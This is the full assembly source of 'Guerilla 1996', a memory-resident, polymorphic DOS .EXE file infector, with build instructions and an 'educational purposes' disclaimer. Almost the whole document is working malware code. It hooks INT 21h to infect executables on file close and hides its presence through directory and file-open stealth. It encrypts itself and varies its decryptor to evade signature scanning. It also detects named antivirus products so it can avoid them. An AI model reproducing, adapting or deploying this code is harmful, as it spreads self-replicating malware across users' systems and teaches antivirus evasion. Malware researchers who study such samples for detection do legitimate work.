; 
; Guerilla 1996 
; Memory resident polymorphic DOS .EXE infector  
; Brute Force Full Stealth (BFFS)
; Designed to spread fast and avoid detection-nondestructive & no payload
; Requires 386 or above and MS-DOS 5.0 or above
;
; Disclaimer:
; This file is only for educational purposes. The author takes absolutely
; no responsibility for anything that anyone does with this file. Do not
; modify this file.
;
; To compile use MASM:
;     masm guerilla
;     link guerilla
; (generates guerilla.exe)
;

seg_a       segment byte public
            assume cs:seg_a , ds:seg_a , ss:seg_a
  

startvirus:
            db      0bdh                    ; mov bp, XXh
delta       dw      0


movax305:   mov     al, 05h                 ; 
            mov     ah, 03h                 ;
                                            ;
subbxbx:    and     bx, 0                   ;
            nop                             ;
            db      0cdh, 16h               ;


movsibp:    mov     si, bp                  ;
            clc                             ;
            nop                             ; 
            call    encrypt_decrypt         ;

; --------------------------------------------------------------------------
; ENCRYPTION STARTS HERE
;---------------------------------------------------------------------------

outit:
            push    ds


            clc                             ; 
            call    encrypt_decrypt2        ;
  

testit:

            mov     ah, 30h                 ; Dos-Version ?
            int     21h                     ;
            cmp     al, 5                   ; < 5.0?
            jb      done                    ; then no memory launch

            push    cs
            pop     ds
            lea     dx, [bp+rep_input]      ;
            mov     ah, 09h                 ; 
            int     21h                     ; 
            cmp     bx, 3135h               ; Already resident?
            je      done                    ; then no memory launch


vectorint:  
            sub     ax, ax              
            mov     ds, ax                   

            push    ds:[21h*04h]            ; Offset  of INT 21h
            push    ds:[21h*04h]            ; Offset  of INT 21h
            push    ds:[21h*04h+02h]        ; Segment of INT 21h
            push    ds:[21h*04h+02h]        ; Segment of INT 21h

storeints:
            pop     cs:[bp+int21seg]        ; Segment of INT 21h
            pop     cs:[bp+int21s]          ; Segment of INT 21h
            pop     cs:[bp+int21off]        ; Offset  of INT 21h
            pop     cs:[bp+int21o]          ; Offset  of INT 21h


findavmem:
            xor     di, di
            call    checkresav              ; No memory launch if AV resident
            je      done                    ;

            mov     ax, es
            dec     ax                      
            push    ax                      ; DS = segment of programs MCB
            pop     ds

            inc     di
            mov     al, byte ptr ds:[di-1]
            cmp     al, 'N'                 
            jl      done                    
            mov     bx, word ptr ds:[di+02h]
            sub     bx, (endheap-startvirus+0fh)/16+1
            jc      done                    ; no memory launch if not enuf mem
            mov     ax, word ptr ds:[di+11h]
            sub     ax, (endheap-startvirus+0fh)/16+1
            mov     word ptr ds:[di+02h], bx
            mov     word ptr ds:[di+11h], ax
            mov     es, ax


            sub     ax, ax                
            mov     ds, ax                   

            cli                             ; point to new interrupt location
            mov     word ptr ds:[21h*04h], offset (virusint21-startvirus)
            mov     word ptr ds:[21h*04h+02h], es
            sti

            xor     di, di
            push    cs                   
            pop     ds                  
            cld                         
            mov     cx, endheap-startvirus  ;
            lea     si, [bp+startvirus]     ; 
            rep     movsb                   ; Launch virus into memory

   done:
            pop     ds                      ; DS -> PSP
            push    ds                      ;
            pop     es                      ; ES -> PSP

            mov     ax, es                  ; AX = PSP segment
            add     ax, 10h                 ; Adjust for PSP

            add     word ptr cs:[bp+longjump+2], ax
            db      81h, 0c0h               ; add ax, XXXXh
origss      dw      0

            cli
            db      0bch                    ; mov sp, XXXXh
origsp      dw      0
            mov     ss, ax
            sti

            sub     ax, ax
            sub     bx, bx
            sub     cx, cx
            sub     dx, dx
            sub     si, si
            sub     di, di
            sub     bp, bp

            db      0eah
            ;oooo:ssss                      ; jmp ssss:oooo
  longjump  dd      0fff00000h              ; Original CS:IP

; --------------------------------------------------------------------------
;                             int 21h handler
; --------------------------------------------------------------------------
virusint21:
            push    si
            pushf
            xor     si, si
loopme:     cmp     ah, byte ptr cs:[lookup+si]
            jne     more
            popf
            jmp     word ptr cs:[lookup+si+1]

more:       add     si, 3
            cmp     si, 3*numberconditions
            jne     loopme
            popf
            pop     si
            jmp     go_int

lookup      db      4bh
            dw      offset  checkstealth
            db      4ch
            dw      offset  checkstealth
            db      09h
            dw      offset  repservice
            db      11h
            dw      offset  dirstealth
            db      12h
            dw      offset  dirstealth
            db      4eh
            dw      offset  findstealth
            db      4fh
            dw      offset  findstealth
            db      3dh
            dw      offset  cleanvirus
            db      3eh            
            dw      offset  infectfile       
            db      6ch
            dw      offset  cleanvirus
            db      32h
            dw      offset  checkstealth
           
checkstealth:
            push    ax
            push    bx
            push    di

            mov     di, offset (tbscan-1)
            mov     bx, di

            cmp     ah, 32h
            je      turnoff
            cmp     ah, 4ch
            je      turnon
            mov     si, dx
periodlp:   cmp     byte ptr [si], '.'      
            je      foundperiod
            cmp     byte ptr [si], 0
            je      leaveit
            inc     si
            jmp     periodlp
foundperiod:
scanmore:
          
            dec     si
            inc     di
            mov     al, byte ptr cs:[di]
            cmp     al, byte ptr [si]
            je      scanmore                  
            cmp     al, ' '
            je      turnoff                 ; found one of the bad ones
            add     bx, 8
            mov     di, bx
            cmp     byte ptr cs:[di+1], 0
            jne     periodlp

 turnon:    mov     cs:[stealthon], 1       ; enable  all stealth functions
            jmp     short leaveit
 turnoff:   mov     cs:[stealthon], 0       ; disable all stealth functions

 leaveit:
            pop     di
            pop     bx
            pop     ax
            pop     si
            jmp     go_int

tbscan      db      'NACSBT  '              ; programs that stealth is
win         db      'NIW     '              ; disabled for
tbsetup     db      'PUTESBT '              ;
pkzip       db      'PIZKP   '              ;
arj         db      'JRA     '              ;
rar         db      'RAR     '              ;
lha         db      'AHL     '              ;
adinf       db      'FNIDA   '              ;
            db       00h
         
; ----------------------------------------------------------------------
;                            INT 21 ah=3eh 
; ----------------------------------------------------------------------

infectfile:

            push    ax
            push    bx                  
            push    cx
            push    dx                  
            push    di                  
            push    es                  
            push    ds
            pushf                       
            push    cs
            pop     ds

            cmp     bl, 5                   ; is file handle<5?
            jb      findquit                ; then quit

            call    checkdrive              ; floppy?
            jb      findquit                ; then quit

            cmp     cs:[stealthon], 0       ; is stealth off?
            jz      findquit                ; then quit

            call    sft                     ; get sft


            mov     sftes, es               ; store ES for later
            mov     sftdi, di               ; store DI for later


            cmp     word ptr es:[di+28h],'XE' ; check .EXE file extension
            jne     findquit                  ;
            cmp     byte ptr es:[di+2Ah],'E'  ;
            jne     findquit                  ;

            call    checkmarker             ; check marker #2
            jz      findquit                ;

            call    movepointertotop        ; move sft pointer to TOF

            lea     dx, [header]            ; read header
            call    readheader              ;
            jc      findquit                ; quit if cant read header

            cmp     word ptr [si+18h], 40h  ; windows file?
            je      findquit                ; then quit

            mov     ah, byte ptr [si+0h]    ; check for 'M' in header
            xor     ah, 'M'                 ;
            jne     findquit                ;

            mov     ax, word ptr [si+12h]   ; check marker #1
            ror     ax, 1                   ;
            sub     ax, 23                  ;
            cmp     ax, word ptr [si+0Eh]   ; SS
            jz      findquit                ; quit if already infected


            mov     ax, 4202h               ; get absolute file length
            xor     cx, cx                  ;
            cwd                             ;
            call    simint21h               ; get file length in DX:AX

            mov     sizems, dx              ; save size in dx for later
            mov     sizels, ax              ; save size in ax for later

            or      dx, dx                  ; check filesize
            jz      checklow1               ;
            cmp     dx, 5                   ; too big?
            ja      findquit                ; then quit
            jmp     checkheader             ; else continue
checklow1:
            cmp     ax, 5000                ; too small?
            jb      findquit                ; then quit


checkheader:
            mov     ax, word ptr [si+04h]   ; convert size in header 
            mov     cx, 512                 ; from pages to bytes
            mul     cx                      ;
            mov     cx, word ptr [si+02h]   ;
            or      cx, cx                  ;
            jz      comparesize             ;
            sub     ax, 512                 ;
            sbb     dx, 0                   ;
            add     ax, cx                  ;
            adc     dx, 0                   ;
comparesize:
            cmp     ax, sizels              ; <> means overlays or bad header
            jne     findquit                ;
            cmp     dx, sizems              ; <> means overlays or bad header
            jne     findquit                ;

            mov     dx,word ptr es:[di+20h] ; check filename against
            lea     si, [avtable2]          ; list of programs not to infect
            mov     cx, numberav            ; number in list
rock:
            lodsw                           ;
            cmp     ax, dx                  ;
            je      findquit                ; quit if found a bad one
            loop    rock                    ;

; file is definitely ready to infect now

            push    ds
            pop     es
            lea     si, [header+14h]        ; save original CS:IP
            lea     di, [longjump]          ;
            movsw                           ; DS:SI -> ES:DI
            movsw                           ;

            sub     si, 0ah                 ; save original SS:SP
            lea     di, [origss]            ;
            movsw                           ; DS:SI -> ES:DI
            inc     di                      ;
            inc     di                      ;
            movsw                           ;

            sub     si, 12h                 ; top of header

            push    si                      ; copy clean copy of file header
            lea     di, [origheader]        ;
            cld                             ;
            mov     cx, 18h                 ;
            repz    movsb                   ;
            pop     si                      ;


            mov     ax,5700h                ; get file time/date
            call    simint21h               ;
            mov     time, cx                ; save time for later
            mov     date, dx                ; save date for later

            call    encryptheader           ; encrypt original header copy

            mov     es, sftes               ; SFT in ES:DI
            mov     di, sftdi               ;

            mov     ax, sizels              ; LSW of file size in AX
            mov     dx, sizems              ; MSW or file size in DX 

            mov     word ptr es:[di+15h],ax ; point SFT to EOF
            mov     word ptr es:[di+17h],dx ;


            mov     cx, 16
            div     cx                            



            inc     si                      ; header manipulation start here
            sub     ax, word ptr [si+7]     ; subtract header size
            sbb     dx, 0                   ; 32-bit


            mov     word ptr [si+15h], ax   ; NEW CS
            mov     word ptr [si+13h], dx   ; NEW IP
            mov     delta, dx
            inc     ax
            mov     word ptr [si+0Dh], ax   ; NEW SS=CS+1

            add     ax, 23
            rol     ax, 1
            mov     word ptr [si+11h], ax   ; infection marker #1
            mov     polykey, ax             ; static polymorphic key

  get_key:
            and     al, 0Fh                 ; make al < or = 0Fh
            or      al, al                  ;  
            jnz     goodkey                 ; if got 0
            inc     al                      ; then make 1
goodkey:    mov     byte ptr [crypt],  al   ; for encrypt_decrypt
            mov     byte ptr [crypt2], al   ; for encrypt_decrypt2
            mov     ch, 16                  ; 
            sub     ch, al
            mov     byte ptr [rotdecrypt],ch ; for encrypt_decrypt
            test    al, 1                   ; random use ror or rol for crypt
            jne     use_rorah               ;

use_rolal:  mov     byte ptr [scratch],0c0h ; rol al,cl
            mov     byte ptr [alorah1],05h
            mov     byte ptr [alorah2],05h
            jmp     short here

use_rorah:  mov     byte ptr [scratch],0cch ; ror ah,cl
            mov     byte ptr [alorah1],25h
            mov     byte ptr [alorah2],25h


here:



            mov     word ptr [si+0Fh], 0    ; NEW SP
            add     word ptr [si+09h],(heap-startvirus)/16 + 1

            push    si
            push    di
            push    bx


            mov     bx, 3                   ; Polymorphics
            lea     si, [cctable]           ; 
            lea     di, [clearcarry2]       ; 
            call    polymorph               ;
            lea     di, [clearcarry3]       ;
            call    polymorph               ;
            lea     si, [movax305table]     ;
            lea     di, [movax305]          ;
            call    polymorph               ;
            lea     si, [incditable]        ;
            lea     di, [incdi]             ;
            call    polymorph               ;
            lea     si, [subbxbxtable]      ;
            lea     di, [subbxbx]           ;
            call    polymorph               ;
            lea     si, [movsibptable]      ;
            lea     di, [movsibp]           ;
            call    polymorph               ;
            lea     si, [oredxedxtable]     ;
            lea     di, [oredxedx]          ;
            call    polymorph               ;
            lea     si, [movdi14table]      ;
            lea     di, [movdi14]           ;
            call    polymorph               ;
            lea     si, [adddisitable]      ;
            lea     di, [adddisi]           ;
            call    polymorph               ;
                                             
            mov     bx, 2                   ; Polymorphics
            lea     si, [jumpctable]        ;
            lea     di, [jumpc]             ;
            call    polymorph               ;
            lea     si, [jumpztable]        ;
            lea     di, [jumpz]             ;
            call    polymorph               ;
            lea     si, [decedxtable]       ;
            lea     di, [decedx]            ;
            call    polymorph               ;
                                            

            pop     bx
            pop     di
            pop     si

            call    getmins
            add     cx, offset (heap-startvirus)
            mov     ah, 40h                   

            push    si
            push    di
            push    es
            call    messup                  ; Write virus
            pop     es
            pop     di
            pop     si

            mov     ax, sizels
            mov     dx, sizems

            add     ax, offset heap         ; file size + virus size
            adc     dx, 0

            mov     cx, 512                            
            div     cx
            or      dx, dx
            jz      noremainder
            inc     ax
noremainder: mov     word ptr [si+1], dx 
             mov     word ptr [si+3], ax 


            call    movepointertotop

            lea     dx, [header]            ; write from buffer
            call    writeheader

cont:       mov     ax, 5701h
            mov     cx, time
            and     cx, 0FFE0h
            or      cx, 000101b             ; infection marker #2
            mov     dx, date
            call    simint21h


findquit:
            popf                        
            pop     ds
            pop     es                  
            pop     di                  
            pop     dx                  
            pop     cx                  
            pop     bx                  
            pop     ax 
            pop     si
            jmp     go_int


repservice:
            pop     si
            push    di
            mov     di, dx
            cmp     byte ptr ds:[di], '$'
            pop     di
            jne     go_int
            mov     bx, 3135h                 
            iret

; -------------------------------------------------------------------------
;                      INT 21 ah=4eh, 4fh stealth
; -------------------------------------------------------------------------
findstealth:
            call    simint21h
            jc      endfs

            cmp     cs:[stealthon], 0
            jz      endfs

            push    es
            push    cx
            push    bx
            push    ax
            push    di

            mov     ah, 2fh                 ; current dta
            call    simint21h               ; ES:BX

            xchg    di, bx

            mov     si, di
            add     di, 16h
            add     si, 1ah

            call    searchstcommon

            pop     di
            pop     ax
            pop     bx
            pop     cx
            pop     es
            clc                             ; no error
endfs:
            pop     si
            retf    2                      
                                        
                                        

; -------------------------------------------------------------------------
;                      INT 21 ah=11h, 12h stealth
; -------------------------------------------------------------------------
dirstealth:

            call    simint21h               ; call the interrupt
            or      al, al
            jne     endds

            cmp     cs:[stealthon], 0       ; is stealthoff?
            jz      endds                   ; then quit

            push    es
            push    cx
            push    bx                              
            push    ax
            push    di

            mov     ah, 2fh
            call    simint21h

            xchg    di, bx
            mov     bl, byte ptr es:[di]    ; extended FCB 
            xor     bl, 0ffh
            jne     notextended

            add     di, 7h                  ; fix for extended

notextended:
            mov     si, di                
            add     di, 17h
            add     si, 1dh
            call    searchstcommon
	
            pop     di
            pop     ax
            pop     bx
            pop     cx
            pop     es

endds:
            pop     si
            iret

;----------------------------------------------------------------------------
; SEARCH STEALTH COMMON ROUTINE BETWEEN INT 11/12, 4E/4F
;----------------------------------------------------------------------------
searchstcommon:
;Entry: di=searchtimeaddr, si=searchsizeaddr

            mov     ax, word ptr es:[di]    ; 
            mov     bx, ax
            and     ax, 011111b
            xor     ax, 000101b
            jne     commonquit              ; is marker #2 set?
            mov     cl, 5
            shr     bx, cl
            and     bx, 0111111b


            cmp     word ptr es:[si+2], 0   ; file big enough to stealth?
            jnz     st1                     ; 
            cmp     word ptr es:[si], 5000  ; file big enough to stealth?
            jb      commonquit              ; it is not
   
st1:    
            add     bx, offset (heap-startvirus)
            sub     word ptr es:[si], bx    ; subtract the file length
            sbb     word ptr es:[si+2], 0   ; 32-bit
commonquit:
            ret


; -------------------------------------------------------------------------
; Cleanvirus on OPEN 3dh
; -------------------------------------------------------------------------
cleanvirus:
            pop     si

            push    ax                  
            push    bx                  
            push    cx                  
            push    dx                  
            push    si
            push    di                  
            push    ds                  
            push    es                  
  

            pushf                       


            cmp     ah, 6ch                 ; is it int 21h ah=6ch?
            jne     skip6c
            mov     dx, si                  ; DS:DX now filename
               

skip6c:
            call    checkdrive              ; is it floppy?
            jb      stealthexit             ; then quit

            cmp     cs:[stealthon], 0       ; is stealthoff?
            jz      stealthexit             ; then quit

            mov     ax, 3d00h               ; Open read only
            call    simint21h
            jc      stealthexit             ; quit if cant open



 goodopen:  xchg    bx, ax


            push    cs
            pop     ds

            call    sft
            cmp     word ptr es:[di+28h], 'XE'
            jne     stealthquit
        
            call    checkmarker             ; is marker #2 set?
            jnz     stealthquit             ; else quit

            mov     ax,word ptr es:[di+11h] ; file size
            mov     dx,word ptr es:[di+13h]

            mov     sizels, ax
            mov     sizems, dx

            call    getmins
            add     cx, 1ch
            sub     ax, cx                  ; move to where original header is
            sbb     dx, 0
            mov     word ptr es:[di+15h],ax ; file pointer
            mov     word ptr es:[di+17h],dx

            lea     dx, [origheader]        ; read origheader
            call    readheader
            jc      stealthquit

            call    decryptheader

            cmp     byte ptr [si], 'M'      ; was original header found and
            jne     stealthquit             ; reconstructed correctly?

            call    movepointertotop        ; TOF via SFT

            call    writeheader
            jc      stealthquit             ; quit if cant disinfect



            mov     ax, sizels
            mov     dx, sizems
             
            call    getmins
            add     cx, offset heap
            sub     ax, cx
            sbb     dx, 0
            mov     word ptr es:[di+15h],ax ; file pointer
            mov     word ptr es:[di+17h],dx

            mov     ah, 40h                 ; erase virus from original file
            xor     cx, cx
            call    simint21h

            mov     ax, 5701h
            mov     cx, time
            mov     dx, date
            call    simint21h               ; restore original time & date


stealthquit: mov     ah, 3eh
             call    simint21h

stealthexit:
            popf                         
            pop     es                   
            pop     ds                  
            pop     di                  
            pop     si                  
            pop     dx                  
            pop     cx                  
            pop     bx                  
            pop     ax                  
      


    go_int:
            db      0eah                    ; jmp ssss:oooo
   int21o   dw      ? 
   int21s   dw      ? 


; -----------------------------------------------------------------------
; Scan MCB's for resident AV s/w
; -----------------------------------------------------------------------
; entry  DI=0
; return ZF=0 if none found
; return ZF=1 if one  found

checkresav:
            push    es
            push    ds

            mov     ah, 52h                 ; undocumented
            call    simint21h               ; -> ES:BX
            push    es:[bx-2]
            pop     ds

checkanotherMCB:
            cmp     byte ptr ds:[di], 'M'     
            jz      searchMCB
            cmp     byte ptr ds:[di], 'Z'
            jnz     av_isnt_resident
searchMCB:
            lea     si, [bp+avtable1]       ; addr[avtable1]
            mov     cx, numberavmem         ; number of AV checks

avloop:     mov     ax, word ptr ds:[di+8]
            cmp     ax, word ptr cs:[si]    ; 
            jnz     chkmav                  
            mov     al, byte ptr cs:[si+2]
            cmp     al, byte ptr ds:[di+10]
            jz      av_is_resident
            cmp     al, '*'                 ; is wild card?
            jz      av_is_resident          ; then found one

chkmav:     add     si, 3
            loop    avloop                  ; loop numberavmem times

            mov     ax, ds
            add     ax, ds:[di+3]           ; goto next MCB
            inc     ax
            mov     ds, ax
            jmp     short checkanotherMCB

av_isnt_resident:
av_is_resident:
            pop     ds
            pop     es
            ret


; -----------------------------------------------------------------------
; Get the sft 
; -----------------------------------------------------------------------
; entry  BX=file handle
; return ES:DI=SFT 
;          
     sft:

            push    bx

            mov     ax, 1220h        
            int     2fh             
                                    

            xor     bx, bx
            mov     bl, es:[di]      
            mov     ax, 1216h
            int     2fh
            mov     word ptr es:[di+2], 2     

            pop     bx

            ret

;--------------------------------------------------------------------------
; Check Drive letter
;--------------------------------------------------------------------------
; return CF=0 = not floppy
; return CF=1 = floppy
checkdrive:
            mov     ah, 19h                         
            call    simint21h                      
            cmp     al, 2
            ret

;--------------------------------------------------------------------------
; Check marker #2
;--------------------------------------------------------------------------
checkmarker:
; return ZF=1 = marker #2 set
; return ZF=0 = marker #2 not set
            mov     ax, word ptr es:[di+0dh]
            and     ax, 011111b
            xor     ax, 000101b
            ret

;--------------------------------------------------------------------------
; Read header (1ch bytes)
;--------------------------------------------------------------------------
; entry dx = addr[header]
readheader:
            mov     ah, 3fh                 
            mov     cx, 1ch
            call    simint21h
            mov     si, dx
            ret

;--------------------------------------------------------------------------
; Write header (18h bytes)
;--------------------------------------------------------------------------
; entry dx = addr[header]
writeheader:
            mov     ah, 40h                
            mov     cx, 18h
            call    simint21h
            ret

;--------------------------------------------------------------------------
;  Get files minutes value
;--------------------------------------------------------------------------
; return cx=minutes
getmins:
            mov     cx, word ptr es:[di+0dh]
            shr     cx, 1
            shr     cx, 1
            shr     cx, 1
            shr     cx, 1
            shr     cx, 1
            and     cx, 0111111b
            ret

;--------------------------------------------------------------------------
; Encrypt/Decrypt header (18h bytes)
;--------------------------------------------------------------------------
decryptheader:
encryptheader:
            push    di
            mov     ah, byte ptr [time]
            lea     di, [origheader]
            mov     cx, 18h
h_loop:     mov     al, [di]
            xor     al, ah
            mov     [di], al
            inc     di
            loop    h_loop
            pop     di
            ret


;--------------------------------------------------------------------------
; Move SFT file pointer to top of file 
;--------------------------------------------------------------------------
movepointertotop:
            mov     word ptr es:[di+15h], 0  
            mov     word ptr es:[di+17h], 0
            ret

;--------------------------------------------------------------------------
; Polymorphic routine
;--------------------------------------------------------------------------
; entry  di = addr[destination]
;        si = addr[table of opcodes to use]
;        bx = # of possible instruction variations (max 3)
polymorph:
            push    es
            push    ds
            push    ax
            push    cx
            push    bx
            push    si
            push    di

            push    cs
            pop     ds
            push    cs
            pop     es

            mov     ax, polykey           ; 
            xor     ax, di                ; gives each file a unique
                                          ; polymorphic virus pattern that
                                          ; does not change
 trymore:   

            shr     ax, 1
            mov     cx, ax
            and     cx, 3
            cmp     cx, bx                ; bx = # of possible instruction
            jge     trymore               ; variations

            mov     ax, cx
            mov     cx, 4                 ; 4 opcode length
            mul     cl
            add     si, ax
            mov     cx, 5                 ; 4 opcode length
            jmp     jumploop
            db      0eah
  genloop:  mov     al, cs:[si]
            mov     cs:[di], al
            inc     di
            inc     si
 jumploop:  loop    genloop

            pop     di
            pop     si
            pop     bx
            pop     cx
            pop     ax
            pop     ds
            pop     es
            ret

cctable       db  0f8h,0f8h,0f8h,90h,0bh,0c0h,90h,90h,83h,0c8h,00h,90h
movsibptable  db  55h,5eh,0f8h,0f8h,8bh,0f5h,0bh,0c0h,8bh,0f5h,0bh,0d2h
jumpctable    db  90h,90h,72h,02h,73h,02h,0ebh,02h
adddisitable  db  90h,03h,0feh,90h,0f8h,13h,0feh,0f8h,90h,0f8h,03h,0feh
incditable    db  47h,4fh,47h,90h,4fh,47h,90h,47h,83h,0c7h,01h,90h
decedxtable   db  90h,90h,66h,4ah,66h,83h,0eah,01h
oredxedxtable db  66h,0bh,0d2h,90h,66h,23h,0d2h,90h,66h,83h,0fah,00h
subbxbxtable  db  2bh,0dbh,2bh,0dbh,0bbh,00h,00h,90h,90h,83h,0e3h,00h
movax305table db  0b4h,3h,0b0h,05h,0b9h,05h,03h,91h,0b0h,05h,0b4h,3h
jumpztable    db  74h,02h,0ebh,0e8h,75h,0eah,90h,90h
movdi14table  db  0b8h,14h,00h,97h,0bfh,14h,00h,90h,90h,0bfh,14h,00h
              db  25h,90h

virusname     db  '  Guerilla 1996 PH '
rep_input     db  '$'
stealthon     db   1
numberconditions    equ             11

numberavmem equ             3
avtable1    db 'TB*'        ; TB*  
            db 'NAV'        ; NA*  NAVSTR
            db 'NEM'        ; NE*  NEMESIS


numberav    equ             13
avtable2:   dw 'BT'         ; TB*  TBSCAN
            dw 'IV'         ; VI*  VIRSTOP
            dw 'VA'         ; AV*  AVP
            dw 'AN'         ; NA*  NAVSTR
            dw 'EN'         ; NE*  NEMESIS
            dw 'SV'         ; VS*  VSHIELD OR VSAFE
            dw 'IF'         ; FI*  FINDVIRU
            dw '-F'         ; F-*  F-PROT
            dw 'MI'         ; IM*  IM
            dw 'VF'         ; FV*  FV386
            dw 'CS'         ; SC*  SCAN
            dw 'BQ'         ; QB*  QBASIC
            dw 'VI'         ; IV*  IV

;------------------------------------------------------------------------
; encrypt/decrypt subroutine #2
;------------------------------------------------------------------------
encrypt_decrypt2:

            db      0b0h                    ; mov al, XXh
crypt2:     db      0h
            jc      encryptit2
decryptit2:
            mov     byte ptr cs:[si+addorsub], 02ah         ; sub
            jmp     short findaddr
encryptit2:                                    
            mov     byte ptr cs:[si+addorsub], 02h          ; add
findaddr:   mov     di, offset testit
            add     di, si
            mov     cx, offset (encrypt_decrypt2-testit)

            jmp     patch2
            db      0eah
loop2:                                      
            mov     ah, cs:[di]             
addorsub:   db      02h                     ; add ah,al or sub ah,al
scratch2:   db      0e0h                      
            mov     cs:[di], ah                     
            inc     di                         
patch2:     loop    loop2                      
            ret                             



 messup:
            push    ax
            push    cx

            xor     si, si

            stc
            call    encrypt_decrypt2

            stc
            call    encrypt_decrypt

; -----------------------------------------------------------------------
; ENCRYPTION STOPS HERE
; -----------------------------------------------------------------------
outitend:

            pop     cx
            pop     ax
            call    simint21h

clearcarry2: nop
            nop
            nop
            nop
            call encrypt_decrypt

clearcarry3: nop
            nop
            nop
            nop
            call encrypt_decrypt2

            ret


;------------------------------------------------------------------------
; encrypt/decrypt subroutine #1
;------------------------------------------------------------------------
.386
encrypt_decrypt:

            db      0b1h                    ; mov cl, XXh
crypt:      db      0h
            
jumpc:      db      90h
            db      90h
            db      90h                     ; jc encryptit
            db      90h
  
            db      0b1h                    ; mov cl, XXh
rotdecrypt: db      0h

encryptit:                                    
movdi14:
            mov     di, 14h                 
            nop                             
                                            

adddisi:    add     di, si                            
            nop                             
            nop                             
                                            

            mov     edx, offset (outitend-outit+1)
            jmp     short patch1
            db      0eah
loop1:                                      
            db      2eh
            db      8ah
alorah1:    db      25h                     
                                            
                                            

            db      0d2h                    ; ror ah,cl
scratch:    db      0cch                          

            db      2eh
            db      88h
alorah2:    db      25h                     
                                            
                                            

incdi:      inc     di                      
            nop                              
            nop
            nop

patch1:
decedx:     dec     edx                     
            nop                             
            nop

oredxedx:   cmp     edx, 0                   
                                            
                                            
jumpz:
            db      75h                     ; jnz     loop1
            db      0eah                    ; 
            db      90h
            db      90h
cryptret:
            ret

;--------------------------------------------------------------------------
; Original int 21h routine 
;--------------------------------------------------------------------------

simint21h:                                  ; Simulate interrupt 21h
            pushf                           ; call ssss:oooo
callfar     db      9ah                     ;
int21off    dw      ?                       ; Offset  of interrupt 21h
int21seg    dw      ?                       ; Segment of interrupt 21h
            ret                             ; 



origheader  db      18h dup (?)             ; read buffer
time        dw      0
date        dw      0

heap:                                       
sftes       dw      0
sftdi       dw      0
sizems      dw      0
sizels      dw      0
polykey     dw      0
header      db      1ch dup (?)             ; read buffer
endheap:                                    ; end 

seg_a       ends
end         startvirus
